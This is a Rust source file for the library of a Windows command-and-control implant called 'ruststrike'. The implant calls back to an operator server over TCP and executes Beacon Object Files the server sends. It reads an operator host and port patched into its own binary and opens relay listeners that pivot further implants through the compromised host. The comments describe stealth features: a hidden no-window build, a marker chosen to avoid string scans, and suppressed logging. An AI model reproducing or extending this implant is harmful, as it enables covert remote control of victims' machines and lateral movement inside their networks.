//! ruststrike-implant: shared library for the Windows implant.
//!
//! Connects back to the server over TCP, dispatches `hello` and `bof`
//! messages, and returns output/error. Two thin bin targets link this lib:
//!
//! - `ruststrike-implant`        — console subsystem (dev; shows a window)
//! - `ruststrike-implant-silent` — GUI subsystem (`#![windows_subsystem =
//!   "windows"]`); no console window, runs hidden in the background. Use this
//!   for operator-deployed stubs so "click to run" doesn't pop a cmd window.
//!
//! Both share the loader, the protocol, and the stealth layer (gated logs +
//! benign string padding). Build: native Windows MSVC.

use anyhow::{Context, Result};
use ruststrike_loader::run_bof;
use ruststrike_protocol::{decode_bof, ImplantMessage, ServerMessage};
use std::collections::HashMap;
use std::io::{copy, BufRead, BufReader, BufWriter, Read, Seek, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Mutex, OnceLock};
use std::thread;

#[macro_use]
mod stealth;

/// Magic marker the stub builder appends to a prebuilt implant exe so it
/// reverse-connects to a baked-in host:port without CLI args. Layout:
///   <exe bytes>... <TRAILER_MAGIC> <host> "\x00" <port> "\x00"
/// The implant reads the last ~512 bytes of its own exe to find it; if absent
/// it falls back to args[1]/args[2]. See tools/stubbuilder + clients/server
/// stub_patcher.go.
///
/// Deliberately an opaque byte sequence (not a readable word) so the marker
/// itself isn't a string-scan telltale; the stub builder writes the same bytes.
const TRAILER_MAGIC: &[u8] = &[0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3];

/// The core's (host, port) the parent implant is connected to. Set once at the
/// top of `run()` before the reader thread starts. Relay splice threads read
/// this to dial a fresh connection to the core per accepted child — the child's
/// bytes then flow transparently to the core as a normal new implant session.
static CORE_ADDR: OnceLock<(String, u16)> = OnceLock::new();

/// One running pivot/relay listener. The `TcpListener` is owned by the accept
/// thread; the registry only holds the `done` flag + the wake-up address used to
/// unblock a parked `accept()` on stop (dialing the local addr makes accept()
/// return one connection, the loop then sees `done` and exits, dropping the
/// listener). Keyed by the core-assigned relay_id.
struct RelayHandle {
    done: std::sync::Arc<AtomicBool>,
    wake: std::net::SocketAddr,
}

static RELAYS: OnceLock<Mutex<HashMap<String, RelayHandle>>> = OnceLock::new();

fn relays() -> &'static Mutex<HashMap<String, RelayHandle>> {
    RELAYS.get_or_init(|| Mutex::new(HashMap::new()))
}

/// Implant entry point. Resolves the callback host/port (trailer → CLI args →
/// defaults), connects, and pumps messages until the server closes the stream.
/// Shared by the console and silent (GUI-subsystem) bin targets.
pub fn run() -> Result<()> {
    // Callback host/port resolution order:
    //   1. appended-config trailer on the exe (a patched stub) — lets an
    //      operator deploy one binary per target with no args.
    //   2. CLI args: implant <host> [port]; defaults 127.0.0.1 4444.
    let args: Vec<String> = std::env::args().collect();
    let (host, port) = read_trailer_config().unwrap_or_else(|| {
        let h = args.get(1).cloned().unwrap_or_else(|| "127.0.0.1".to_string());
        let p: u16 = args.get(2).and_then(|s| s.parse().ok()).unwrap_or(4444);
        (h, p)
    });
    let addr = format!("{host}:{port}");
    // Publish the core address so relay splice threads can dial fresh connections
    // to it (set-once; if run() is somehow re-entered the first binding wins).
    let _ = CORE_ADDR.set((host, port));

    let stream = TcpStream::connect(&addr).with_context(|| format!("connecting {addr}"))?;
    vlog!("[implant] connected to {addr}");

    let read_stream = stream.try_clone().context("cloning stream")?;
    let writer = BufWriter::new(stream);

    let (tx, rx) = std::sync::mpsc::channel::<ImplantMessage>();
    let send_tx = tx.clone();

    // Reader thread: server -> dispatch.
    std::thread::spawn(move || reader_loop(read_stream, send_tx));

    // Main thread only receives; drop our sender so the channel closes when the
    // reader thread exits.
    drop(tx);

    let mut writer = writer;
    // Sender: drain outbound messages from the channel.
    for msg in rx.iter() {
        if send(&mut writer, &msg).is_err() {
            vlog!("[implant] connection lost");
            break;
        }
    }
    vlog!("[implant] exiting");
    Ok(())
}

/// Read the appended-config trailer from this exe, if present. Returns
/// (host, port) on success. Reads only the last 512 bytes (the trailer is
/// short) to avoid scanning the whole ~334 KB binary.
fn read_trailer_config() -> Option<(String, u16)> {
    let exe_path = std::env::current_exe().ok()?;
    let mut f = std::fs::File::open(&exe_path).ok()?;
    let len = f.metadata().ok()?.len();
    if len == 0 {
        return None;
    }
    let window: u64 = 512;
    let start = len.saturating_sub(window);
    f.seek(std::io::SeekFrom::Start(start)).ok()?;
    let mut tail = Vec::with_capacity((len - start) as usize);
    f.read_to_end(&mut tail).ok()?;
    // find the magic
    let idx = find_subslice(&tail, TRAILER_MAGIC)?;
    let body = &tail[idx + TRAILER_MAGIC.len()..];
    // host \0 port \0
    let host_end = body.iter().position(|&b| b == 0)?;
    let host = std::str::from_utf8(&body[..host_end]).ok()?.to_string();
    let rest = &body[host_end + 1..];
    let port_end = rest.iter().position(|&b| b == 0).unwrap_or(rest.len());
    let port: u16 = std::str::from_utf8(&rest[..port_end]).ok()?.parse().ok()?;
    if host.is_empty() || port == 0 {
        return None;
    }
    Some((host, port))
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|w| w == needle)
}

fn reader_loop(stream: TcpStream, tx: std::sync::mpsc::Sender<ImplantMessage>) {
    let mut reader = BufReader::new(stream);
    let mut line = String::new();
    loop {
        line.clear();
        match reader.read_line(&mut line) {
            Ok(0) => {
                vlog!("[implant] server closed connection");
                break;
            }
            Ok(_) => {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let msg = match serde_json::from_str::<ServerMessage>(trimmed) {
                    Ok(m) => m,
                    Err(e) => {
                        let _ = tx.send(ImplantMessage::Error {
                            data: format!("bad request ({e})"),
                        });
                        continue;
                    }
                };
                let reply = handle(msg);
                if tx.send(reply).is_err() {
                    break;
                }
            }
            Err(e) => {
                let _ = &e; // referenced only by vlog! (verbose feature)
                vlog!("[implant] read error: {e}");
                break;
            }
        }
    }
}

fn handle(msg: ServerMessage) -> ImplantMessage {
    match msg {
        ServerMessage::Hello => ImplantMessage::Hello {
            data: "ready".to_string(),
        },
        ServerMessage::Bof { file, args } => {
            let coff = match decode_bof(&file) {
                Ok(b) => b,
                Err(e) => {
                    return ImplantMessage::Error { data: format!("decode: {e}") };
                }
            };
            // `args` is base64-encoded raw BOF arg buffer (binary). Decode; an
            // empty/missing args string is fine (some BOFs take none).
            let args_bytes = decode_bof(&args).unwrap_or_default();
            match run_bof(&coff, &args_bytes) {
                Ok(output) => ImplantMessage::Output { data: output },
                Err(e) => ImplantMessage::Error {
                    data: format!("exec: {e:#}"),
                },
            }
        }
        ServerMessage::RelayListen { relay_id, bind_ip, port } => {
            start_relay(relay_id, bind_ip, port)
        }
        ServerMessage::RelayStop { relay_id } => stop_relay(relay_id),
    }
}

/// Bind a pivot/relay listener and spawn its accept loop. Returns the
/// `RelayStarted` reply (with the actual bound port) or `RelayError` on bind
/// failure. The accept loop runs on a detached thread for the implant's
/// lifetime; each accepted child is spliced onto a fresh core connection.
fn start_relay(relay_id: String, bind_ip: String, port: u16) -> ImplantMessage {
    let ln = match TcpListener::bind((bind_ip.as_str(), port)) {
        Ok(l) => l,
        Err(e) => {
            return ImplantMessage::RelayError {
                relay_id,
                data: format!("bind: {e}"),
            }
        }
    };
    let local = match ln.local_addr() {
        Ok(a) => a,
        Err(e) => {
            return ImplantMessage::RelayError {
                relay_id,
                data: format!("local_addr: {e}"),
            }
        }
    };
    let bound_port = local.port();
    let done = std::sync::Arc::new(AtomicBool::new(false));
    relays()
        .lock()
        .unwrap()
        .insert(relay_id.clone(), RelayHandle { done: done.clone(), wake: local });
    let rid = relay_id.clone();
    thread::spawn(move || accept_loop(rid, ln, done));
    ImplantMessage::RelayStarted {
        relay_id,
        bind_ip,
        port: bound_port,
    }
}

/// Stop a relay listener. Idempotent — an unknown id still reports stopped.
/// Sets `done` and dials the listener's local addr to unblock a parked
/// `accept()`; the accept loop then sees `done` and exits, dropping the socket.
fn stop_relay(relay_id: String) -> ImplantMessage {
    let handle = relays().lock().unwrap().remove(&relay_id);
    if let Some(h) = handle {
        h.done.store(true, Ordering::SeqCst);
        // Wake the parked accept(). Best-effort — if the dial fails (e.g. the
        // listener is bound to an addr we can't reach from here) the loop will
        // only exit on the next real connection. Relays are usually 0.0.0.0.
        let wake = format!("{}:{}", h.wake.ip(), h.wake.port());
        if let Err(e) = TcpStream::connect_timeout(
            &h.wake,
            std::time::Duration::from_millis(500),
        ) {
            let _ = &e; // referenced only by vlog! (verbose feature)
            vlog!("[implant] relay {relay_id} wake dial {wake} failed: {e}");
        }
        let _ = wake;
    }
    ImplantMessage::RelayStopped { relay_id }
}

/// Per-relay accept loop. Owns the listener; exits when `done` is set (the
/// wake-up dial in `stop_relay` makes the parked accept() return so we can
/// observe it). Each accepted child gets its own splice thread.
fn accept_loop(relay_id: String, ln: TcpListener, done: std::sync::Arc<AtomicBool>) {
    let _ = &relay_id; // referenced only by vlog! (verbose feature)
    loop {
        match ln.accept() {
            Ok((child, _peer)) => {
                if done.load(Ordering::SeqCst) {
                    // Stopped while parked — discard the wake-up connection.
                    vlog!("[implant] relay {relay_id} stopping");
                    return;
                }
                vlog!("[implant] relay {relay_id} accepted child");
                thread::spawn(move || splice(child));
            }
            Err(e) => {
                if done.load(Ordering::SeqCst) {
                    return;
                }
                let _ = &e; // referenced only by vlog! (verbose feature)
                vlog!("[implant] relay {relay_id} accept error: {e}");
                return;
            }
        }
    }
}

/// Splice one child's stream onto a fresh connection to the core. The child's
/// bytes are transparent newline-JSON, so the core registers a normal new
/// implant session. Two copy threads (one per direction); when either ends it
/// shuts down both sides of both streams so the other copy returns promptly.
fn splice(child: TcpStream) {
    let (host, port) = match CORE_ADDR.get() {
        Some(a) => a.clone(),
        None => return,
    };
    let core = match TcpStream::connect((host.as_str(), port)) {
        Ok(c) => c,
        Err(e) => {
            let _ = &e; // referenced only by vlog! (verbose feature)
            vlog!("[implant] relay splice: dial core failed: {e}");
            return;
        }
    };
    let child_a = match child.try_clone() {
        Ok(c) => c,
        Err(_) => return,
    };
    let core_a = match core.try_clone() {
        Ok(c) => c,
        Err(_) => return,
    };
    // child -> core
    let t1 = thread::spawn(move || {
        let mut c = child;
        let mut g = core;
        let _ = copy(&mut c, &mut g);
        let _ = g.shutdown(Shutdown::Both);
        let _ = c.shutdown(Shutdown::Both);
    });
    // core -> child
    let t2 = thread::spawn(move || {
        let mut g = core_a;
        let mut c = child_a;
        let _ = copy(&mut g, &mut c);
        let _ = c.shutdown(Shutdown::Both);
        let _ = g.shutdown(Shutdown::Both);
    });
    let _ = t1.join();
    let _ = t2.join();
}

fn send(writer: &mut BufWriter<TcpStream>, msg: &ImplantMessage) -> Result<()> {
    writer.write_all(msg.to_json().as_bytes())?;
    writer.write_all(b"\n")?;
    writer.flush()?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a fake exe body + trailer in a temp file and confirm the reader
    /// extracts host:port. The reader reads its OWN exe (std::env::current_exe),
    /// so this test can't drive read_trailer_config directly; instead we test
    /// the trailer-parsing logic against a synthetic tail buffer via the same
    /// code path (find magic + parse fields).
    #[test]
    fn parses_trailer_from_tail() {
        // simulate an exe's last bytes: some padding, then magic + host\0 port\0
        let mut tail = b"some padding bytes that are not the magic\0\0".to_vec();
        tail.extend_from_slice(TRAILER_MAGIC);
        tail.extend_from_slice(b"10.0.0.5");
        tail.push(0);
        tail.extend_from_slice(b"4455");
        tail.push(0);
        // replicate the parse logic from read_trailer_config
        let idx = find_subslice(&tail, TRAILER_MAGIC).expect("magic present");
        let body = &tail[idx + TRAILER_MAGIC.len()..];
        let host_end = body.iter().position(|&b| b == 0).unwrap();
        let host = std::str::from_utf8(&body[..host_end]).unwrap().to_string();
        let rest = &body[host_end + 1..];
        let port_end = rest.iter().position(|&b| b == 0).unwrap();
        let port: u16 = std::str::from_utf8(&rest[..port_end]).unwrap().parse().unwrap();
        assert_eq!(host, "10.0.0.5");
        assert_eq!(port, 4455);
    }

    #[test]
    fn no_trailer_returns_none() {
        let tail = b"just some exe bytes with no magic marker at all".to_vec();
        assert!(find_subslice(&tail, TRAILER_MAGIC).is_none());
    }

    /// Starting a relay on port 0 (OS-assigned) yields RelayStarted with a
    /// nonzero port and registers it; stopping yields RelayStopped and removes
    /// it. Exercises start_relay/stop_relay + the registry without a live core
    /// (the accept loop spawns but no child connects, so splice isn't hit).
    #[test]
    fn relay_start_stop_on_auto_port() {
        let id = "rl-test1".to_string();
        let msg = start_relay(id.clone(), "127.0.0.1".to_string(), 0);
        let port = match msg {
            ImplantMessage::RelayStarted { port, relay_id, .. } => {
                assert_eq!(relay_id, id);
                assert!(port != 0, "OS should assign a nonzero port");
                port
            }
            other => panic!("expected RelayStarted, got {other:?}"),
        };
        assert!(relays().lock().unwrap().contains_key(&id), "relay registered");
        // The listener is actually bound — prove it by dialing it (this also
        // wakes the accept loop briefly, but done is false so it keeps running).
        let dial = TcpStream::connect(("127.0.0.1", port));
        assert!(dial.is_ok(), "dial bound relay port {port}");
        // stop
        let stopped = stop_relay(id.clone());
        match stopped {
            ImplantMessage::RelayStopped { relay_id } => assert_eq!(relay_id, id),
            other => panic!("expected RelayStopped, got {other:?}"),
        }
        assert!(!relays().lock().unwrap().contains_key(&id), "relay removed");
        // Give the accept loop a beat to exit + drop the socket.
        thread::sleep(std::time::Duration::from_millis(150));
        // After stop the bound port should no longer accept (listener dropped).
        // (Best-effort: a stale TIME_WAIT won't accept a new connection.)
        let _ = port;
    }

    /// Binding a port already in use returns RelayError (not a panic).
    #[test]
    fn relay_bind_conflict_reports_error() {
        let sentinel = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let taken = sentinel.local_addr().unwrap().port();
        let msg = start_relay("rl-conflict".to_string(), "127.0.0.1".to_string(), taken);
        match msg {
            ImplantMessage::RelayError { relay_id, data } => {
                assert_eq!(relay_id, "rl-conflict");
                assert!(data.contains("bind"), "error should mention bind: {data}");
            }
            other => panic!("expected RelayError, got {other:?}"),
        }
        drop(sentinel);
    }

    /// Stopping an unknown id is idempotent (still RelayStopped, no panic).
    #[test]
    fn relay_stop_unknown_is_idempotent() {
        let msg = stop_relay("rl-nonexistent".to_string());
        match msg {
            ImplantMessage::RelayStopped { relay_id } => assert_eq!(relay_id, "rl-nonexistent"),
            other => panic!("expected RelayStopped, got {other:?}"),
        }
    }
}
